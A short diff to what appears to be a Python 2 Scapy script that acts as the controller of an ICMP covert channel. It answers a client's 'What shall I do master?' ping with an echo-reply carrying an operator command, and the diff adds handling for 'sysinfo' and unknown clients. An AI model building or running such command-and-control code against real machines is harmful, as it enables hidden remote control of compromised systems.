@@ -36,8 +36,13 @@ def main(argv):
 				if request == 'What shall I do master?':
 					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
 					print "[*] Response sent: " + sys.argv[1]
-				#resp.show2()
+					#resp.show2()
 					send(resp)
+				elif request == 'sysinfo':
+					print "[*] Client sent sysinfo"
+				else:	
+					print "[**] Client not recognized"
+				
 			except: 
 				print "[X] ERROR: ", sys.exc_info()[0]  
 
